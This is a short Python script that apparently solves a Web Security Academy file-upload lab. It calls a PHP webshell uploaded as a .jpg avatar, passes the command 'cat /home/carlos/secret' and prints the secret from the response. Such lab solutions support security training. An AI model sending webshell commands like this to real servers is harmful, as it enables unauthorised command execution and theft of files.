from bs4 import BeautifulSoup
import requests

URL = "https://0a43009303db343898ee1bde00c800e3.web-security-academy.net"
FILE_URI = "/files/avatars"
PAYLOAD = "/easy-simple-php-webshell.jpg?cmd=cat /home/carlos/secret"
SESSION = "8pBHN0n7rSvwncu59WtYvIKwZ5CfB0eI"

COOKIE = {"session" : SESSION}

resp = requests.get(URL + FILE_URI + PAYLOAD, cookies=COOKIE)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0]
print(flag)